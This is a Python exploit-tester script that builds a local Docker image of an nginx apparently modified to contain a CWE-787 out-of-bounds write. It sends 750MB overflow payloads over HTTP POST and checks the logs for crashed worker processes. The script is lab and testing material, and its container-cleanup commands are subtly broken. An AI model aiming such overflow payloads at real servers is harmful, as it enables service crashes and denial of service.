#!/usr/bin/env python3

import socket
import time
import subprocess
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama for terminal colors
init()

def log_message(message, level="INFO", color=None):
    """Log a message with timestamp, level and color"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    colors = {
        "INFO": Fore.BLUE,
        "DEBUG": Fore.CYAN,
        "SUCCESS": Fore.GREEN,
        "ERROR": Fore.RED,
        "WARNING": Fore.YELLOW
    }
    
    color = color or colors.get(level, Fore.WHITE)
    print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")

def print_banner():
    """Print a cool banner"""
    banner = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════╗
║                                                                ║
║  {Fore.YELLOW}NGINX CWE-787 BUFFER OVERFLOW EXPLOIT TESTER{Fore.RED}           ║
║                                                                ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def build_docker():
    """Build the Docker image"""
    log_message("Building Docker image...", "INFO")
    try:
        subprocess.run(["docker", "build", "-t", "nginx-cwe787", "."], check=True, capture_output=True)
        log_message("✓ Docker image built successfully", "SUCCESS")
        return True
    except subprocess.CalledProcessError as e:
        log_message(f"✗ Error building Docker image: {e}", "ERROR")
        return False

def start_container():
    """Start the Docker container"""
    log_message("Starting container...", "INFO")
    try:
        # Stop any existing containers
        subprocess.run(["docker", "ps", "-q", "--filter", "ancestor=nginx-cwe787"], capture_output=True)
        subprocess.run(["docker", "stop", "$(docker ps -q --filter ancestor=nginx-cwe787)"], shell=True, capture_output=True)
        subprocess.run(["docker", "rm", "$(docker ps -a -q --filter ancestor=nginx-cwe787)"], shell=True, capture_output=True)
        
        # Start new container
        result = subprocess.run(
            ["docker", "run", "-d", "-p", "80:80", "nginx-cwe787"],
            capture_output=True,
            text=True
        )
        container_id = result.stdout.strip()
        
        # Wait for Nginx to start
        time.sleep(5)
        log_message(f"✓ Container started with ID: {container_id}", "SUCCESS")
        return container_id
    except Exception as e:
        log_message(f"✗ Error starting container: {e}", "ERROR")
        return None

def get_container_logs(container_id):
    """Get container logs"""
    try:
        result = subprocess.run(
            ["docker", "logs", container_id],
            capture_output=True,
            text=True
        )
        return result.stdout
    except Exception as e:
        log_message(f"✗ Error getting logs: {e}", "ERROR")
        return None

def check_container_status(container_id):
    """Check if container is still running and get detailed status"""
    try:
        # Get container status
        status = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Status}}", container_id],
            capture_output=True,
            text=True
        ).stdout.strip()
        
        # Get process status inside container
        processes = subprocess.run(
            ["docker", "exec", container_id, "ps", "aux"],
            capture_output=True,
            text=True
        ).stdout
        
        # Get memory usage
        memory = subprocess.run(
            ["docker", "exec", container_id, "free", "-m"],
            capture_output=True,
            text=True
        ).stdout
        
        # Get Nginx error logs
        logs = subprocess.run(
            ["docker", "exec", container_id, "cat", "/usr/local/nginx/logs/error.log"],
            capture_output=True,
            text=True
        ).stdout
        
        log_message(f"Container Status: {status}", "DEBUG")
        log_message("Process Status:", "DEBUG")
        print(f"{Fore.CYAN}{processes}{Style.RESET_ALL}")
        log_message("Memory Usage:", "DEBUG")
        print(f"{Fore.CYAN}{memory}{Style.RESET_ALL}")
        
        # Check for worker crashes
        crash_detected = False
        crash_info = {
            "signal": None,
            "worker": None,
            "time": None
        }
        
        for line in logs.split('\n'):
            if "worker process" in line and "exited on signal" in line:
                crash_detected = True
                parts = line.split()
                crash_info["worker"] = parts[3]
                crash_info["signal"] = parts[6]
                crash_info["time"] = line.split(']')[0].strip('[')
                break
        
        if crash_detected:
            log_message(f"✓ Worker crash detected! Signal: {crash_info['signal']}", "SUCCESS")
            log_message(f"Worker: {crash_info['worker']} at {crash_info['time']}", "SUCCESS")
        
        return crash_detected
        
    except Exception as e:
        log_message(f"Error checking container status: {e}", "ERROR")
        return False

def create_overflow_payload(exploit_type):
    """Create a payload that will trigger the buffer overflow"""
    if exploit_type == 1:
        # First exploit: Fixed buffer overflow
        # Create payload with index and data
        index = 786432000  # 750MB in bytes
        payload = index.to_bytes(8, byteorder='little')  # 64-bit index
        payload += b"A" * 786432000  # 750MB of data to write
    else:
        # Second exploit: Dynamic array overflow
        # Create payload with array size and index
        array_size = 16  # Very small array size
        index = 786432000  # 750MB index
        payload = array_size.to_bytes(8, byteorder='little')  # Array size
        payload += index.to_bytes(8, byteorder='little')      # Index
        payload += b"B" * 786432000  # 750MB of data to write
    return payload

def exploit(host="localhost", port=80, exploit_type=1):
    """Exploit the CWE-787 vulnerability in ngx_recv.c"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)  # Increase timeout to 30 seconds
        s.connect((host, port))
        
        # Set socket options for better performance
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
        
        # Create payload
        payload = create_overflow_payload(exploit_type)
        
        # Prepare HTTP request
        request = b"POST / HTTP/1.1\r\n"
        request += b"Host: " + host.encode() + b"\r\n"
        request += b"Content-Type: application/octet-stream\r\n"
        request += b"Content-Length: " + str(len(payload)).encode() + b"\r\n\r\n"
        
        log_message(f"Sending payload for exploit type {exploit_type}...", "DEBUG")
        if exploit_type == 1:
            log_message("Using fixed buffer overflow payload (750MB)", "DEBUG")
        else:
            log_message("Using dynamic array overflow payload (750MB)", "DEBUG")
        
        # Send headers first
        s.send(request)
        time.sleep(1)  # Wait for headers to be processed
        
        # For exploit type 2, we need to send the payload in parts
        if exploit_type == 2:
            # Send array size first
            array_size = 16
            s.send(array_size.to_bytes(8, byteorder='little'))
            time.sleep(0.1)
            
            # Send index
            index = 786432000
            s.send(index.to_bytes(8, byteorder='little'))
            time.sleep(0.1)
            
            # Send data
            data = b"B" * 786432000
        else:
            data = payload
        
        # Send payload in smaller chunks with retries
        chunk_size = 8192
        total_sent = 0
        max_retries = 3
        
        while total_sent < len(data):
            try:
                chunk = data[total_sent:total_sent + chunk_size]
                retries = 0
                
                while retries < max_retries:
                    try:
                        sent = s.send(chunk)
                        if sent == 0:
                            log_message("Connection closed by server", "WARNING")
                            break
                        total_sent += sent
                        log_message(f"Sent {total_sent}/{len(data)} bytes", "DEBUG")
                        time.sleep(0.01)  # Small delay between chunks
                        break
                    except socket.error as e:
                        retries += 1
                        if retries == max_retries:
                            raise e
                        time.sleep(0.1)  # Wait before retry
                        continue
                
            except socket.error as e:
                log_message(f"Socket error while sending: {e}", "WARNING")
                break
        
        log_message(f"Total bytes sent: {total_sent}", "DEBUG")
        
        # Try to receive response
        try:
            response = s.recv(4096)
            if response:
                if b"500" in response or b"502" in response:
                    log_message("✓ Server returned error - Possible exploit success!", "SUCCESS")
                elif b"200" in response:
                    log_message("⚠ Server returned 200 OK - Exploit may have failed", "WARNING")
            else:
                log_message("✓ Server did not respond - Possible exploit success!", "SUCCESS")
        except socket.error as e:
            log_message(f"✓ Socket error (possible exploit success): {e}", "SUCCESS")
        
        s.close()
        
    except Exception as e:
        log_message(f"✗ Exploit error: {e}", "ERROR")
        return False
    
    return True

def main():
    print_banner()
    
    log_message("Starting CWE-787 exploit tests", "INFO")
    
    # Store results for summary
    results = []
    
    # Test both exploit types
    for exploit_type in [1, 2]:
        log_message(f"\n{'='*50}", "INFO")
        log_message(f"Testing Exploit Type {exploit_type}", "INFO")
        log_message(f"{'='*50}", "INFO")
        
        # Build and start fresh container for each test
        if not build_docker():
            log_message("Failed to build Docker image. Aborting.", "ERROR")
            return
        
        container_id = start_container()
        if not container_id:
            log_message("Failed to start container. Aborting.", "ERROR")
            return
        
        try:
            if exploit("localhost", 80, exploit_type):
                log_message(f"✓ Test completed for exploit type {exploit_type}", "SUCCESS")
            else:
                log_message(f"✗ Test failed for exploit type {exploit_type}", "ERROR")
            
            # Check container status and logs
            crash_detected = check_container_status(container_id)
            if crash_detected:
                log_message("✓ Worker crash detected - Exploit successful!", "SUCCESS")
                results.append({
                    "type": exploit_type,
                    "status": "CRASH",
                    "details": "Worker process crashed with SIGSEGV"
                })
            else:
                log_message("⚠ No worker crash detected - Exploit may have failed", "WARNING")
                results.append({
                    "type": exploit_type,
                    "status": "NO_CRASH",
                    "details": "Worker process did not crash"
                })
            
        finally:
            # Clean up container after each test
            log_message("Cleaning up container...", "INFO")
            subprocess.run(["docker", "stop", container_id], capture_output=True)
            subprocess.run(["docker", "rm", container_id], capture_output=True)
        
        time.sleep(2)  # Small delay between tests
    
    # Print summary
    print(f"\n{Fore.YELLOW}{'='*50}")
    print("EXPLOIT TEST SUMMARY")
    print(f"{'='*50}{Style.RESET_ALL}")
    
    if not results:
        print(f"{Fore.GREEN}No tests were completed{Style.RESET_ALL}")
    else:
        crashes = sum(1 for r in results if r["status"] == "CRASH")
        print(f"{Fore.RED}Found {crashes} crashes in {len(results)} tests:{Style.RESET_ALL}")
        
        for result in results:
            print(f"\n{Fore.YELLOW}Exploit Type {result['type']}:")
            if result['type'] == 1:
                print("Fixed Buffer Overflow")
            else:
                print("Dynamic Array Overflow")
            print(f"Status: {result['status']}")
            print(f"Details: {result['details']}")
            print(f"{Style.RESET_ALL}")
    
    log_message("Test finished", "INFO")

if __name__ == "__main__":
    main() 